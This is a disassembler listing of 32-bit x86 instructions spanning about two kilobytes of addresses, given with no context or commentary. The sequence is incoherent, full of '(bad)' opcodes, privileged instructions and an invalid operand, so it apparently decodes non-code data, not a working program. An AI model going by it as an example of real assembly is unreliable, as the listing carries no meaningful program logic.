  4adcd5:	fild   WORD PTR [eax+0x40fdc849]
  4adcdb:	xchg   edi,eax
  4adcdc:	sahf   
  4adcdd:	mov    BYTE PTR [esi-0x226a8cf5],dl
  4adce3:	mov    edi,0xd48689bd
  4adce8:	pop    ss
  4adce9:	(bad)  
  4adcea:	fmul   DWORD PTR [esi+0x7031480b]
  4adcf0:	test   BYTE PTR [edx+ebp*8-0x65f2b5a1],0x1a
  4adcf8:	jp     0x4adca4
  4adcfa:	and    BYTE PTR [ecx],ch
  4adcfc:	add    eax,0x8c48f311
  4add01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4add02:	adc    eax,0x920fae2f
  4add07:	xchg   DWORD PTR [edx],ebp
  4add09:	das    
  4add0a:	add    eax,0x12051012
  4add0f:	ins    DWORD PTR es:[edi],dx
  4add10:	adc    ah,BYTE PTR [ebx+0x803de92]
  4add16:	dec    eax
  4add17:	rcl    DWORD PTR [ecx+ecx*4-0x1b553e1f],0x5
  4add1f:	adc    edi,DWORD PTR [eax]
  4add21:	mov    cl,0xf4
  4add23:	xchg   ebp,eax
  4add24:	jl     0x4adcf6
  4add26:	add    BYTE PTR [ebp+0x5],dl
  4add29:	adc    dh,ah
  4add2b:	pop    esp
  4add2c:	pop    esp
  4add2d:	or     bl,BYTE PTR [eax+0x61]
  4add30:	pop    edi
  4add31:	pop    es
  4add32:	add    DWORD PTR [ebp-0x515a5ee0],ecx
  4add38:	or     al,BYTE PTR [eax]
  4add3a:	daa    
  4add3b:	dec    ebx
  4add3c:	add    BYTE PTR [edi],dh
  4add3e:	shr    DWORD PTR [eax+0x7cd2ac4b],0xe
  4add45:	and    bh,BYTE PTR [ecx+0x12b700c2]
  4add4b:	mov    DWORD PTR [eax],0x4570a087
  4add51:	lock xchg ebp,eax
  4add53:	cmp    eax,0x70b2a08
  4add58:	push   eax
  4add59:	aam    0xbf
  4add5b:	mov    esi,DWORD PTR [eax]
  4add5d:	pushf  
  4add5e:	and    esi,ebp
  4add60:	in     al,0xe7
  4add62:	xchg   esp,eax
  4add63:	test   DWORD PTR [edi],ebp
  4add65:	mov    cl,0x71
  4add67:	lock lea edx,[eax+eiz*2]
  4add6b:	inc    ebp
  4add6c:	inc    eax
  4add6d:	push   ecx
  4add6e:	or     DWORD PTR [ebx],edi
  4add70:	and    al,dh
  4add72:	div    BYTE PTR [ebp-0x57c07bb2]
  4add78:	add    DWORD PTR [ecx+eiz*4],esp
  4add7b:	nop
  4add7c:	mov    ebp,DWORD PTR [edx-0x5a6073dd]
  4add82:	sbb    bh,BYTE PTR [edi+0x4f]
  4add85:	cmc    
  4add86:	push   es
  4add87:	or     DWORD PTR [esi],ecx
  4add89:	or     eax,0x521f0e4b
  4add8e:	xor    eax,0xdfebf6a4
  4add93:	jp     0x4add49
  4add95:	pop    ebx
  4add96:	or     eax,0xef32c7e9
  4add9b:	lea    ecx,[ebp-0x5efc3b4c]
  4adda1:	push   esp
  4adda2:	arpl   WORD PTR [edi],cx
  4adda4:	loopne 0x4addc4
  4adda6:	(bad)  
  4adda7:	lock fcomp DWORD PTR [edx-0x67]
  4addab:	mov    ebp,0xc4c1f84f
  4addb0:	mov    dl,0x95
  4addb2:	neg    BYTE PTR ds:0xc0487410
  4addb8:	pop    ebx
  4addb9:	xchg   BYTE PTR [esi-0x46],bl
  4addbc:	xor    DWORD PTR [eax+ebx*1],esp
  4addbf:	or     al,BYTE PTR ds:0x106c8338
  4addc5:	cs mov ah,0x51
  4addc8:	fcomp  DWORD PTR [eax+eiz*1]
  4addcb:	mov    edi,0x5c565c
  4addd0:	iret   
  4addd1:	dec    edx
  4addd2:	lods   eax,DWORD PTR ds:[esi]
  4addd3:	push   edi
  4addd4:	dec    edi
  4addd5:	or     ebp,DWORD PTR [ecx+0x17]
  4addd8:	or     eax,0x78191d45
  4adddd:	mov    cl,0x42
  4adddf:	push   eax
  4adde0:	sahf   
  4adde1:	adc    al,0x14
  4adde3:	mov    es,ecx
  4adde5:	ins    DWORD PTR es:[edi],dx
  4adde6:	sbb    bh,BYTE PTR es:[ecx+0x48]
  4addea:	push   0xf0bba48d
  4addef:	xchg   BYTE PTR [ebp+ecx*1+0xb],ah
  4addf3:	std    
  4addf4:	inc    ebx
  4addf5:	cld    
  4addf6:	inc    esi
  4addf7:	dec    ecx
  4addf8:	push   ss
  4addf9:	into   
  4addfa:	add    DWORD PTR [eax],edx
  4addfc:	adc    DWORD PTR [eax+0x4],ecx
  4addff:	jg     0x4add84
  4ade01:	(bad)  
  4ade02:	cdq    
  4ade03:	inc    edx
  4ade04:	or     DWORD PTR [eax+eax*1+0x4701101],ecx
  4ade0b:	push   edx
  4ade0c:	sub    BYTE PTR ds:0xf88ddc0d,bl
  4ade12:	sbb    eax,0x9f5160e4
  4ade17:	or     eax,0x1d89eb1b
  4ade1c:	xor    BYTE PTR [ecx-0x68],dh
  4ade1f:	inc    ebp
  4ade20:	arpl   WORD PTR [ecx],sp
  4ade22:	mov    esp,0xf09520e3
  4ade27:	bswap  ecx
  4ade29:	sub    DWORD PTR [ebx+0x28],0xa85118c5
  4ade30:	jae    0x4ade3a
  4ade32:	hlt    
  4ade33:	pusha  
  4ade34:	pop    edx
  4ade35:	mov    ch,0x16
  4ade37:	sbb    al,0xe9
  4ade39:	and    eax,0x169c9480
  4ade3e:	cmp    DWORD PTR [edi],esi
  4ade40:	stos   BYTE PTR es:[edi],al
  4ade41:	add    al,0xd0
  4ade43:	add    cl,BYTE PTR [esi]
  4ade45:	adc    BYTE PTR [ecx],bh
  4ade47:	je     0x4ade76
  4ade49:	cwde   
  4ade4a:	fidiv  WORD PTR [esp+ebp*2-0x5d]
  4ade4e:	sub    bh,BYTE PTR [eax]
  4ade50:	es xchg esp,eax
  4ade52:	cmp    DWORD PTR [ecx],esp
  4ade54:	or     DWORD PTR [eax],ebx
  4ade56:	inc    eax
  4ade57:	mov    ?,esi
  4ade59:	push   esp
  4ade5a:	aam    0x83
  4ade5c:	and    DWORD PTR [edi-0x4bdd9acc],0x46540f
  4ade66:	retf   0x41ac
  4ade69:	arpl   WORD PTR [edx],dx
  4ade6b:	pop    eax
  4ade6c:	mov    bh,0x80
  4ade6e:	cmp    edx,ebx
  4ade70:	cmp    BYTE PTR [edi-0x2d84d9db],bl
  4ade76:	mov    edi,0xe14f0430
  4ade7b:	imul   esp,DWORD PTR cs:[edx-0xa],0x88876dbf
  4ade83:	adc    bl,BYTE PTR [edx]
  4ade85:	sbb    BYTE PTR [edi-0x7],dl
  4ade88:	push   0x982b18ee
  4ade8d:	dec    eax
  4ade8e:	in     al,0x30
  4ade90:	lock xor al,0x8f
  4ade93:	and    cl,ah
  4ade95:	test   al,0xeb
  4ade97:	(bad)  
  4ade98:	pop    esp
  4ade99:	add    esi,0x60c04d0a
  4ade9f:	mov    BYTE PTR ds:0xe21f5202,dh
  4adea5:	cmp    al,0x82
  4adea7:	push   cs
  4adea8:	add    DWORD PTR [ebp-0x6a],edi
  4adeab:	lock mov WORD PTR [eax-0x7c1713fd],es
  4adeb2:	dec    esi
  4adeb3:	(bad)
  4adeb6:	push   ds
  4adeb7:	mov    al,0x81
  4adeb9:	idiv   DWORD PTR [ebp+ebp*4+0x533f1cae]
  4adec0:	data16 loopne 0x4adeac
  4adec3:	(bad)
  4adec7:	and    BYTE PTR [ecx-0x1e4cc039],al
  4adecd:	ins    DWORD PTR es:[edi],dx
  4adece:	dec    edx
  4adecf:	xor    eax,DWORD PTR [eax+esi*1-0x6b]
  4aded3:	(bad)  
  4aded4:	dec    ecx
  4aded5:	int    0x4
  4aded7:	scas   al,BYTE PTR es:[edi]
  4aded8:	or     al,0x9c
  4adeda:	sti    
  4adedb:	add    al,al
  4adedd:	sti    
  4adede:	add    al,0xe4
  4adee0:	test   BYTE PTR ss:0x3c9cd723,bl
  4adee7:	in     al,0x2d
  4adee9:	add    DWORD PTR [eax-0x3e],esi
  4adeec:	push   ecx
  4adeed:	push   ss
  4adeee:	push   edx
  4adeef:	cmp    DWORD PTR [ecx],ebx
  4adef1:	cmp    ecx,ebx
  4adef3:	and    al,bh
  4adef5:	test   DWORD PTR [eax+0x28],edx
  4adef8:	dec    esp
  4adef9:	jp     0x4aded4
  4adefb:	mov    dl,0x79
  4adefd:	hlt    
  4adefe:	stos   DWORD PTR es:[edi],eax
  4adeff:	ret    
  4adf00:	sub    al,0xb5
  4adf02:	jbe    0x4adf2c
  4adf04:	int3   
  4adf05:	dec    edi
  4adf06:	push   eax
  4adf07:	imul   edi,DWORD PTR [ebp-0x332db648],0xffffff9c
  4adf0e:	out    dx,eax
  4adf0f:	push   edi
  4adf10:	std    
  4adf11:	adc    BYTE PTR [esi],al
  4adf13:	repnz add al,BYTE PTR [ebx-0x60]
  4adf17:	push   edi
  4adf18:	push   0xa8818150
  4adf1d:	pop    es
  4adf1e:	mov    ah,0x38
  4adf20:	je     0x4adf62
  4adf22:	sbb    DWORD PTR [eax+0x1d],esp
  4adf25:	test   DWORD PTR [edi+0x6fcd40d5],ebx
  4adf2b:	push   ecx
  4adf2c:	sbb    ch,BYTE PTR [esi+ebp*1]
  4adf2f:	sbb    dl,BYTE PTR [edx-0x6]
  4adf32:	lock hlt 
  4adf34:	xor    eax,0x991087bc
  4adf39:	frstor [ecx+0x5018f601]
  4adf3f:	pop    esi
  4adf40:	push   edi
  4adf41:	mov    ds:0x52689585,eax
  4adf46:	sbb    al,0x46
  4adf48:	pop    ss
  4adf49:	sub    edi,DWORD PTR [ecx]
  4adf4b:	xchg   BYTE PTR [edx+ebx*2],dl
  4adf4e:	dec    eax
  4adf4f:	lock push es
  4adf51:	and    al,0x78
  4adf53:	pop    eax
  4adf54:	das    
  4adf55:	inc    edi
  4adf56:	test   BYTE PTR [edi],ch
  4adf58:	or     ebp,DWORD PTR [edx]
  4adf5a:	or     BYTE PTR [ecx+0x72c95663],dl
  4adf60:	mov    ecx,0xae32fb4
  4adf65:	xchg   esp,eax
  4adf66:	cwde   
  4adf67:	pushf  
  4adf68:	cs xchg edi,eax
  4adf6a:	retf   
  4adf6b:	in     eax,0xa0
  4adf6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4adf6e:	test   al,0xac
  4adf70:	mov    al,0x12
  4adf72:	mov    ds:0x46845203,al
  4adf77:	pusha  
  4adf78:	ror    DWORD PTR [ecx],0x4
  4adf7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4adf7c:	ret    0x4c18
  4adf7f:	out    0x95,eax
  4adf81:	mov    esi,0x84e412e4
  4adf86:	test   BYTE PTR [ebp+0x7f],dl
  4adf89:	xor    BYTE PTR [edi],cl
  4adf8b:	push   cs
  4adf8c:	nop
  4adf8d:	and    bh,al
  4adf8f:	cmp    cl,0x8e
  4adf92:	rol    cl,cl
  4adf94:	leave  
  4adf95:	jp     0x4adfd5
  4adf97:	adc    eax,0x4c8ae046
  4adf9c:	or     al,0x2c
  4adf9e:	scas   eax,DWORD PTR es:[edi]
  4adf9f:	push   cs
  4adfa0:	bound  ebp,QWORD PTR [eax+0x17c5fc98]
  4adfa6:	push   0x1
  4adfa8:	sbb    eax,0x38b03616
  4adfad:	out    dx,eax
  4adfae:	and    BYTE PTR [edx+0x24],dl
  4adfb1:	inc    ebp
  4adfb2:	icebp  
  4adfb3:	cld    
  4adfb4:	xor    DWORD PTR [esi+0x4d193dcf],eax
  4adfba:	xor    ecx,0xb893c2b
  4adfc0:	dec    ebp
  4adfc1:	es out dx,al
  4adfc3:	(bad)  
  4adfc4:	loope  0x4adfce
  4adfc6:	jns    0x4ae008
  4adfc8:	cmp    BYTE PTR ds:0xba30a685,dh
  4adfce:	rol    DWORD PTR [esi+ecx*8],0x2d
  4adfd2:	daa    
  4adfd3:	adc    esp,DWORD PTR [ecx+edx*8]
  4adfd6:	and    eax,0xa3a895b0
  4adfdb:	dec    edx
  4adfdc:	pusha  
  4adfdd:	pop    ss
  4adfde:	add    edx,ecx
  4adfe0:	adc    al,0xef
  4adfe2:	mov    ebx,eax
  4adfe4:	rep lods al,BYTE PTR ds:[esi]
  4adfe6:	sub    DWORD PTR [esi],0x75
  4adfe9:	add    bl,BYTE PTR [eax-0x72]
  4adfec:	outs   dx,BYTE PTR ds:[esi]
  4adfed:	ja     0x4ae04b
  4adfef:	pop    es
  4adff0:	sub    BYTE PTR [ebx-0x48],bl
  4adff3:	push   ecx
  4adff4:	daa    
  4adff5:	(bad)  
  4adff6:	or     al,0x21
  4adff8:	pop    ss
  4adff9:	dec    ebx
  4adffa:	sbb    edi,DWORD PTR [eax]
  4adffc:	adc    ah,BYTE PTR ds:0x17235c0a
  4ae002:	push   edx
  4ae003:	ret    0xe808
  4ae006:	int    0x53
  4ae008:	add    al,0x47
  4ae00a:	sbb    DWORD PTR [ecx+0x11],esp
  4ae00d:	scas   eax,DWORD PTR es:[edi]
  4ae00e:	or     bl,BYTE PTR [ecx+0x48]
  4ae011:	xchg   ebx,eax
  4ae012:	add    DWORD PTR [eax+0x62],edx
  4ae015:	pop    eax
  4ae016:	or     eax,0xbbea6986
  4ae01b:	mov    ds:0x521290c0,eax
  4ae020:	(bad)  
  4ae021:	out    0x54,eax
  4ae023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ae024:	xchg   esi,eax
  4ae025:	xchg   dl,al
  4ae027:	xchg   ebp,eax
  4ae028:	sub    al,BYTE PTR [edi+0x4f2e8016]
  4ae02e:	add    ecx,DWORD PTR [ebp+0x2ee07bce]
  4ae034:	adc    eax,0x2b959d62
  4ae039:	cmp    BYTE PTR [ecx+0x4909fba5],ah
  4ae03f:	and    edi,DWORD PTR [eax]
  4ae041:	jmp    0x4ae04f
  4ae043:	and    eax,DWORD PTR [edx]
  4ae045:	lods   al,BYTE PTR ds:[esi]
  4ae046:	sub    al,0x61
  4ae048:	fiadd  DWORD PTR [edi-0x61e7e7d4]
  4ae04e:	aas    
  4ae04f:	out    dx,al
  4ae050:	and    DWORD PTR [eax+0x3f0c29e5],eax
  4ae056:	mov    esp,0xdc7d0111
  4ae05b:	push   0x94518d93
  4ae060:	and    al,0xb8
  4ae062:	inc    ebp
  4ae063:	sahf   
  4ae064:	xlat   BYTE PTR ds:[ebx]
  4ae065:	mov    fs:0x442452d0,al
  4ae06b:	push   es
  4ae06c:	dec    eax
  4ae06d:	dec    esp
  4ae06e:	jns    0x4ae00e
  4ae070:	out    0x79,eax
  4ae072:	push   eax
  4ae073:	push   esp
  4ae074:	pop    eax
  4ae075:	pop    esp
  4ae076:	pusha  
  4ae077:	mov    dl,0x3e
  4ae079:	pusha  
  4ae07a:	loop   0x4ae0e0
  4ae07c:	sbb    BYTE PTR [eax-0x54],ch
  4ae07f:	inc    edi
  4ae080:	jmp    0x3c9c:0x8e72e2ca
  4ae087:	inc    ebx
  4ae088:	lock and ch,0x3b
  4ae08c:	ror    DWORD PTR [esp+ebx*1],0x9
  4ae090:	and    al,0x78
  4ae092:	xchg   DWORD PTR [ecx+0x2c],esi
  4ae095:	imul   ebx,eax,0xad64f21f
  4ae09b:	or     al,BYTE PTR [ebp-0x15]
  4ae09e:	retf   0xd7
  4ae0a1:	lods   eax,DWORD PTR ds:[esi]
  4ae0a2:	mov    fs,esi
  4ae0a4:	add    ecx,edx
  4ae0a6:	or     edx,DWORD PTR [edi+0x47]
  4ae0a9:	and    ebp,DWORD PTR [ebx]
  4ae0ab:	or     al,0x1c
  4ae0ad:	jns    0x4ae117
  4ae0af:	mov    al,ds:0xce960d09
  4ae0b4:	ja     0x4ae0e8
  4ae0b6:	fisub  DWORD PTR [esi-0x38]
  4ae0b9:	rdtsc  
  4ae0bb:	or     al,BYTE PTR [ebx]
  4ae0bd:	mov    fs,WORD PTR [edi]
  4ae0bf:	popa   
  4ae0c0:	sahf   
  4ae0c1:	into   
  4ae0c2:	aaa    
  4ae0c3:	adc    al,BYTE PTR [esi+0x5a]
  4ae0c6:	xchg   esp,eax
  4ae0c7:	pop    es
  4ae0c8:	std    
  4ae0c9:	rol    eax,0xbd
  4ae0cc:	out    dx,al
  4ae0cd:	fs dec edi
  4ae0cf:	push   ecx
  4ae0d0:	pop    esi
  4ae0d1:	pushf  
  4ae0d2:	sub    BYTE PTR [ebx+0x5f86dca7],dl
  4ae0d8:	mov    al,0x9f
  4ae0da:	int3   
  4ae0db:	cwde   
  4ae0dc:	fsub   st,st(1)
  4ae0de:	jbe    0x4ae07e
  4ae0e0:	adc    DWORD PTR [edx+eiz*2-0x6ddb58f5],esi
  4ae0e7:	iret   
  4ae0e8:	ror    esi,0x29
  4ae0eb:	dec    eax
  4ae0ec:	lods   eax,DWORD PTR ds:[esi]
  4ae0ed:	xor    ch,BYTE PTR [eax-0x4870e4f7]
  4ae0f3:	mov    ch,0x3a
  4ae0f5:	jo     0x4ae10d
  4ae0f7:	cmp    BYTE PTR [edi+0x65],dh
  4ae0fa:	or     BYTE PTR [edi],dl
  4ae0fc:	inc    edi
  4ae0fd:	xchg   ecx,eax
  4ae0fe:	lods   eax,DWORD PTR ds:[esi]
  4ae0ff:	fsubp  st(0),st
  4ae101:	inc    edx
  4ae102:	or     eax,0x16c625db
  4ae107:	push   0x835417d2
  4ae10c:	dec    ebp
  4ae10d:	mov    ebx,0xcb7203a5
  4ae112:	xor    al,0x6a
  4ae114:	adc    al,0x71
  4ae116:	push   es
  4ae117:	push   eax
  4ae118:	xor    BYTE PTR [eax],bl
  4ae11a:	mov    ds:0xb2b4b644,al
  4ae11f:	sub    bh,ah
  4ae121:	test   BYTE PTR [eax],cl
  4ae123:	repnz sub eax,0x3d44266b
  4ae129:	or     DWORD PTR [eax+0x6a],0xb46cd04
  4ae130:	mov    ebp,esp
  4ae132:	fimul  WORD PTR [edi-0x2d2c24c4]
  4ae138:	sbb    eax,0xa18898e9
  4ae13d:	mov    al,0x1c
  4ae13f:	in     al,dx
  4ae140:	gs cdq 
  4ae142:	bound  edx,QWORD PTR [ecx-0x7b]
  4ae145:	fs cmp al,0xb8
  4ae148:	and    BYTE PTR [edi+0x7],dl
  4ae14b:	jo     0x4ae0e7
  4ae14d:	loopne 0x4ae0f7
  4ae14f:	add    al,0x3a
  4ae151:	and    DWORD PTR [esi+edi*4+0x3],edx
  4ae155:	push   cs
  4ae156:	sbb    eax,DWORD PTR [esi+eiz*2]
  4ae159:	push   esp
  4ae15a:	adc    BYTE PTR [ebx],cl
  4ae15c:	js     0x4ae1a9
  4ae15e:	rcr    BYTE PTR [eax],0xb2
  4ae161:	rol    DWORD PTR [edi+0x2d],cl
  4ae164:	test   eax,0x814e095a
  4ae169:	ret    0x8370
  4ae16c:	test   ch,ah
  4ae16e:	xchg   DWORD PTR [ebp-0x44],esp
  4ae171:	push   es
  4ae172:	inc    edx
  4ae173:	adc    DWORD PTR [esi+0x52],0x8e30c0c6
  4ae17a:	cdq    
  4ae17b:	adc    BYTE PTR [eax],cl
  4ae17d:	or     eax,0xf8be8283
  4ae182:	bound  esi,QWORD PTR [edx-0x11e9ae78]
  4ae188:	or     al,0xe1
  4ae18a:	iret   
  4ae18b:	jle    0x4ae191
  4ae18d:	add    ah,dl
  4ae18f:	add    esi,DWORD PTR [edi+0x19bf05a6]
  4ae195:	xor    BYTE PTR [ebx],al
  4ae197:	(bad)  
  4ae198:	xor    eax,0x47cf9825
  4ae19d:	jbe    0x4ae16f
  4ae19f:	adc    DWORD PTR [ecx-0xe],eax
  4ae1a2:	(bad)  
  4ae1a3:	sti    
  4ae1a4:	dec    eax
  4ae1a5:	loop   0x4ae1c3
  4ae1a7:	test   BYTE PTR [esi+0x21],bh
  4ae1aa:	inc    eax
  4ae1ab:	mov    eax,0x41845106
  4ae1b0:	ret    0x56ca
  4ae1b3:	dec    eax
  4ae1b4:	idiv   ebp
  4ae1b6:	(bad)  
  4ae1b7:	xor    BYTE PTR [esp+ecx*1-0x76beab38],al
  4ae1be:	push   ss
  4ae1bf:	inc    edx
  4ae1c0:	fist   WORD PTR [edi+0x42]
  4ae1c3:	stos   BYTE PTR es:[edi],al
  4ae1c4:	and    ebp,DWORD PTR [edi]
  4ae1c6:	sahf   
  4ae1c7:	int3   
  4ae1c8:	adc    DWORD PTR [eax],ebp
  4ae1ca:	push   eax
  4ae1cb:	popa   
  4ae1cc:	adc    dh,BYTE PTR [esi+0x2eaed93b]
  4ae1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae1d3:	jl     0x4ae1a4
  4ae1d5:	loopne 0x4ae198
  4ae1d7:	jge    0x4ae1e0
  4ae1d9:	scas   al,BYTE PTR es:[edi]
  4ae1da:	cmp    DWORD PTR [edi+ecx*1],ecx
  4ae1dd:	mov    WORD PTR ds:0x12643de2,gs
  4ae1e3:	dec    ebx
  4ae1e4:	xchg   BYTE PTR [edi],dl
  4ae1e6:	and    ebx,DWORD PTR [ebx+0x39423ab4]
  4ae1ec:	sub    dh,BYTE PTR [esp+ebx*1+0x11]
  4ae1f0:	push   esi
  4ae1f1:	xchg   ebp,eax
  4ae1f2:	ret    0x3fc0
  4ae1f5:	mov    ebp,0xc0c9e32
  4ae1fa:	fsubr  DWORD PTR [edx+0x1]
  4ae1fd:	sbb    al,0xdc
  4ae1ff:	dec    esp
  4ae200:	push   edi
  4ae201:	mov    ds:0x10665168,eax
  4ae206:	fs add edi,DWORD PTR es:[esi]
  4ae20a:	or     al,0xe
  4ae20c:	inc    esp
  4ae20d:	xor    BYTE PTR [edi+0xb9d3f23],al
  4ae213:	fs je  0x4ae1aa
  4ae216:	and    al,0x76
  4ae218:	pushf  
  4ae219:	stos   DWORD PTR es:[edi],eax
  4ae21a:	push   cs
  4ae21b:	popa   
  4ae21c:	cmp    dh,BYTE PTR [ebp-0x6a8d651f]
  4ae222:	loop   0x4ae1de
  4ae224:	inc    esp
  4ae225:	pop    ds
  4ae226:	sbb    ebp,DWORD PTR [ebp-0x68]
  4ae229:	mov    edx,0xc0d381d1
  4ae22e:	rcr    al,1
  4ae230:	popa   
  4ae231:	and    BYTE PTR [ecx+0x52c9c418],cl
  4ae237:	or     ebx,DWORD PTR [ebp-0x10]
  4ae23a:	fiadd  DWORD PTR [ebx+eiz*4+0x53]
  4ae23e:	xchg   DWORD PTR [eax-0x746f13d1],esi
  4ae244:	std    
  4ae245:	xor    BYTE PTR [ebx+0x1c],bh
  4ae248:	gs pop es
  4ae24a:	pop    ebx
  4ae24b:	mov    edx,0x80bf1044
  4ae250:	add    eax,0xa3787eec
  4ae255:	sbb    dh,BYTE PTR [edx+edx*2]
  4ae258:	sti    
  4ae259:	or     eax,0xc25834d7
  4ae25e:	stos   BYTE PTR es:[edi],al
  4ae25f:	xchg   edi,eax
  4ae260:	rcr    DWORD PTR [edx],0x54
  4ae263:	sbb    edx,esp
  4ae265:	or     ch,bh
  4ae267:	push   ds
  4ae268:	test   BYTE PTR [eax+0x8ad3ade],al
  4ae26e:	dec    eax
  4ae26f:	and    eax,DWORD PTR [eax+0x7c]
  4ae272:	push   es
  4ae273:	mov    cl,0xa
  4ae275:	test   eax,0xea035c4
  4ae27a:	jg     0x4ae2ac
  4ae27c:	jne    0x4ae2e5
  4ae27e:	or     al,0x9a
  4ae280:	add    DWORD PTR [ecx+ebx*4],ebx
  4ae283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae284:	sub    al,0xe
  4ae286:	add    eax,DWORD PTR [edi+eax*2+0x37]
  4ae28a:	or     cl,bh
  4ae28c:	and    bl,BYTE PTR [ecx-0x16ff5280]
  4ae292:	stos   BYTE PTR es:[edi],al
  4ae293:	shr    DWORD PTR [ecx-0x38],0x2b
  4ae297:	fwait
  4ae298:	xor    BYTE PTR [esi+0x1bdaf48b],0x5d
  4ae29f:	test   bh,al
  4ae2a1:	cdq    
  4ae2a2:	(bad)  
  4ae2a3:	popa   
  4ae2a4:	adc    dh,dh
  4ae2a6:	ret    0xd33b
  4ae2a9:	lock imul ebx,DWORD PTR [esi+0x4e],0x32
  4ae2ae:	pop    esi
  4ae2af:	adc    bh,BYTE PTR [eax+0x2d]
  4ae2b2:	jl     0x4ae331
  4ae2b4:	pop    eax
  4ae2b5:	lods   al,BYTE PTR ds:[esi]
  4ae2b6:	aaa    
  4ae2b7:	test   DWORD PTR [ecx+0x3b],ebx
  4ae2ba:	and    DWORD PTR ds:[edi+0x28ca5c49],eax
  4ae2c1:	and    ebp,DWORD PTR [edx+0x7206c589]
  4ae2c7:	sub    eax,DWORD PTR [edi]
  4ae2c9:	sbb    ecx,DWORD PTR [edi+0x6e]
  4ae2cc:	cmp    DWORD PTR [edx+0x32],0x51
  4ae2d0:	or     esi,DWORD PTR [ecx+esi*4]
  4ae2d3:	cwde   
  4ae2d4:	loopne 0x4ae304
  4ae2d6:	xchg   edx,eax
  4ae2d7:	aas    
  4ae2d8:	mov    eax,ds:0x550572fd
  4ae2dd:	shr    DWORD PTR [ecx],cl
  4ae2df:	push   es
  4ae2e0:	sbb    DWORD PTR [esi-0x1],edx
  4ae2e3:	dec    DWORD PTR [ebp+0x64]
  4ae2e6:	adc    dh,ch
  4ae2e8:	sbb    dl,BYTE PTR [ecx-0x27d4e34a]
  4ae2ee:	mov    DWORD PTR [ecx+0x77242cb1],ebp
  4ae2f4:	xor    DWORD PTR [edx],ebx
  4ae2f6:	jle    0x4ae310
  4ae2f8:	out    dx,eax
  4ae2f9:	ss xor esi,edx
  4ae2fc:	pop    edi
  4ae2fd:	das    
  4ae2fe:	push   ss
  4ae2ff:	add    dh,cl
  4ae301:	sahf   
  4ae302:	neg    DWORD PTR [esi]
  4ae304:	push   ds
  4ae305:	call   0x2961c518
  4ae30a:	push   ebp
  4ae30b:	push   es
  4ae30c:	add    BYTE PTR [eax],dl
  4ae30e:	in     al,dx
  4ae30f:	mov    es,WORD PTR [eax]
  4ae311:	aas    
  4ae312:	add    al,0x5
  4ae314:	add    eax,DWORD PTR [eax]
  4ae316:	je     0x4ae36a
  4ae318:	js     0x4ae367
  4ae31a:	icebp  
  4ae31b:	push   0x18
  4ae31d:	inc    esi
  4ae31e:	or     bl,BYTE PTR [esi+0xa]
  4ae321:	cmp    DWORD PTR [ecx+0x667d9fa8],eax
  4ae327:	jne    0x4ae370
  4ae329:	push   es
  4ae32a:	mov    al,BYTE PTR [esi]
  4ae32c:	add    BYTE PTR [ebx+0x1e9693d],0x91
  4ae333:	inc    edi
  4ae334:	repz add cl,dh
  4ae337:	mov    bh,0x2a
  4ae339:	mov    bh,0xc1
  4ae33b:	sbb    DWORD PTR [edx+edx*4-0x54bd6b6a],esp
  4ae342:	xchg   ebx,eax
  4ae343:	pop    esi
  4ae344:	or     ah,BYTE PTR [ecx*4+0x5528fd19]
  4ae34b:	retf   0x9516
  4ae34e:	ja     0x4ae310
  4ae350:	add    BYTE PTR [edi+0x34744c48],cl
  4ae356:	aam    0x44
  4ae358:	and    al,0x91
  4ae35a:	mov    eax,DWORD PTR [ebp-0x15]
  4ae35d:	test   BYTE PTR [edx-0x4fa25a4d],al
  4ae363:	addr16 loope 0x4ae3b9
  4ae366:	xchg   BYTE PTR ds:0x9d291c8b,dl
  4ae36c:	add    edi,DWORD PTR [edx]
  4ae36e:	or     ebp,DWORD PTR [ebx]
  4ae370:	adc    dl,BYTE PTR [eax+edx*1-0x1f]
  4ae374:	stos   DWORD PTR es:[edi],eax
  4ae375:	lahf   
  4ae376:	add    DWORD PTR [esi+0x511ecd08],eax
  4ae37c:	out    0x5d,eax
  4ae37e:	sbb    al,0x19
  4ae380:	cmp    dl,BYTE PTR [ebp+ecx*2+0x76]
  4ae384:	add    al,0xe7
  4ae386:	shr    DWORD PTR [edi+0x56484709],1
  4ae38c:	push   edi
  4ae38d:	or     DWORD PTR [eax+0x13],ebp
  4ae390:	sbb    BYTE PTR [edi+0x3385fa1f],0xb
  4ae397:	push   0xa
  4ae399:	add    DWORD PTR [ebp+0x51308b30],ecx
  4ae39f:	pop    edx
  4ae3a0:	and    BYTE PTR [eax-0x5e],bl
  4ae3a3:	and    edi,DWORD PTR [edi+0x43b5eb43]
  4ae3a9:	outs   dx,BYTE PTR ds:[esi]
  4ae3aa:	add    al,0x37
  4ae3ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae3ad:	cmp    DWORD PTR [ecx],esp
  4ae3af:	add    eax,0x34bd252e
  4ae3b4:	adc    ch,bl
  4ae3b6:	add    esp,DWORD PTR ds:0xcf0901c6
  4ae3bc:	cmp    ebp,DWORD PTR [eax-0x40]
  4ae3bf:	sub    ch,0xf9
  4ae3c2:	sbb    al,0x10
  4ae3c4:	into   
  4ae3c5:	inc    ecx
  4ae3c6:	mov    eax,DWORD PTR [ebx]
  4ae3c8:	push   0xd450cc37
  4ae3cd:	ftst   
  4ae3cf:	push   ecx
  4ae3d0:	mov    bl,0x80
  4ae3d2:	cmp    eax,DWORD PTR [edi]
  4ae3d4:	inc    edx
  4ae3d5:	xchg   ebx,eax
  4ae3d6:	fwait
  4ae3d7:	cmp    dh,BYTE PTR [ebx-0x28]
  4ae3da:	xchg   ebx,eax
  4ae3db:	nop
  4ae3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae3dd:	sbb    eax,0x30193b3c
  4ae3e2:	in     al,0x50
  4ae3e4:	pop    ds
  4ae3e5:	arpl   WORD PTR [eax+0x3c],ax
  4ae3e8:	mov    edx,DWORD PTR [ebx]
  4ae3ea:	cs mov al,0xa3
  4ae3ed:	repnz mov esi,DWORD PTR [esi+0xb76140]
  4ae3f4:	mov    ebp,0x552f4551
  4ae3f9:	ret    0xf09
  4ae3fc:	lock mov esi,DWORD PTR [edx]
  4ae3ff:	sub    al,BYTE PTR [esi*4+0x304c3a9a]
